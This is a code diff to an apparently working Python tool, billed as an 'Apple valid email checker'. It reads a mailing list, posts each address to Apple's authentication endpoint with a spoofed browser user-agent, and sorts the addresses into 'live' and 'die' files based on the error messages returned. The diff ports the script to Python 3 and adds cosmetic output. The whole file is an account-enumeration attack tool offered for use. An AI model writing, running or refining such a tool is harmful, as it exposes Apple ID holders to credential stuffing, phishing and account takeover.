@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 # Codeed By DsXWEB19778
 # Python LOV3er
 # Contact To facebook.com/name.path
@@ -8,13 +9,15 @@ import platform as ps
 from fake_useragent import UserAgent
 import os
 import time
+import sys
+import random as h
 import colorama as c
-from termcolor import colored
 from os import path as y
 # SET COLOR :
 red = c.Fore.LIGHTRED_EX
 green = c.Fore.LIGHTGREEN_EX
 yellow = c.Fore.LIGHTYELLOW_EX
+blue = c.Fore.LIGHTBLUE_EX
 giv_p = ps.system()
 if(giv_p == "Windows"):
 	os.system("cls")
@@ -23,7 +26,9 @@ if(giv_p == "Windows"):
 	os.system("color "+str(color_red))
 else:
 	os.system("clear")
-print (""" 
+clear = "\x1b[0m"
+colors = [36,30]  
+xlog = """ 
   DDDDDDDDD   SSSSSSSSSS 
   DD     DD   SS      SS
   DD     DD           SS
@@ -31,7 +36,10 @@ print ("""
   DD     DD   SS             DSWEB19778  
   DD     DD   SS      SS     2019
   DDDDDDDDD   SSSSSSSSSS          
-""")
+"""
+for N, line in enumerate(xlog.split("\n")):
+            sys.stdout.write("\x1b[1;%dm%s%s\n" % (h.choice(colors), line, clear))
+            time.sleep(0.05)
 print("[+] Coded By DsWeb19778 >> 2019 [REALYEAR]")
 print("[+] CopyRight | >> facebook.com/name.path")
 print("[+] APPLE VALID EMAIL CHECKER ... ")
@@ -44,7 +52,7 @@ mydate()
 # Url Exploited 
 url = "https://idmsac.apple.com/authenticate"
 # hahah Mailist
-appleId = raw_input(">> My Mailist File /..//..>>>> ")
+appleId = input(">> My Mailist File /..//..>>>> ")
 print(">> RZLT FILE...")
 time.sleep(3)
 # Create File RZT
@@ -72,6 +80,9 @@ Mode_File = "r+"
 try:
   open_file = open(appleId,Mode_File)
   read_me = open_file.readlines()
+  get_listcount = len(read_me)
+  print(green+"[+] YOU HAVE >> "+str(get_listcount)+" ACCOUNT\n") 
+  time_full = "- " + blue + time.ctime() + " "
   #print("We have ERROR FILE :>> "+str(e))  
   for i in read_me:
       i.strip()
@@ -80,17 +91,17 @@ try:
       my_fake_s = UserAgent() # GEN FAKE AGENT 
       headers = {'User-Agent': my_fake_s.chrome}
       connect = p.post(url,params=get_data,headers=headers).content
-      valid_msg = "Application has insufficient privileges to perform this action"
-      dia_msg = "Your Apple ID or password was entered incorrectly."
+      valid_msg = "Application has insufficient privileges to perform this action".encode()
+      dia_msg = "Your Apple ID or password was entered incorrectly.".encode()
       #get_listed = get_email_validation["result"]
       if (valid_msg in connect):
-        	print(green+"[+] Valid :>> "+i)
+        	print(time_full+green+"[+] Valid :>> "+i)
         	save_valid = open("rzlt/live.txt","a+")
-        	save_valid.write(i+"\n")	
+        	save_valid.write(i)	
       elif(dia_msg in connect):
-        	print(red+"[-] Die :>> "+i)
+        	print(time_full+red+"[-] Die :>> "+i)
         	save_invalid = open("rzlt/die.txt","a+")
-        	save_invalid.write(i+"\n")
+        	save_invalid.write(i)
       else:
           print(yellow+"[+] LIMITED :>> "+i)  
 except IOError as e:
